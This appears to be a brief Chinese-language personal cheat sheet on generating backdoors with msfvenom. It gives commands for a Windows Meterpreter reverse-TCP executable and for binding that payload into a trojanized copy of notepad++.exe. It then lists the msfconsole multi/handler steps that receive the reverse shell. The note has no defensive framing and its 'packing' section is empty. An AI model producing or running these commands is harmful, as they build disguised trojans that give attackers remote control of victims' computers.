## 后门生成工具-msfvenom

<img src="../../../xwechat_files/wxid_d936ffd07v9a22_38ce/temp/InputTemp/f54c1f8c-3da5-495c-b78b-73b513e54fe1.png" alt="f54c1f8c-3da5-495c-b78b-73b513e54fe1" style="zoom:75%;" />

##### 默认格式：

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.13.131 lport=9999 -f exe -o demo.exe

##### 捆绑木马：

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.13.131 lport=9999 -f exe -x notepad++.exe -o notepad++.exe

##### 加壳：





##### 步骤：

1. 进入控制台

   - msfconsole

2. 使用模块

   - use exploit/multi/handler 使用模块

3. 配置

   - show options   (或options)
   - set payload windows/x64/meterpreter/reverse_tcp
   - set lhost 192.168.13.131  (lhost本机的ip)
   - set lport 9999

4. 运行

   - run

   

   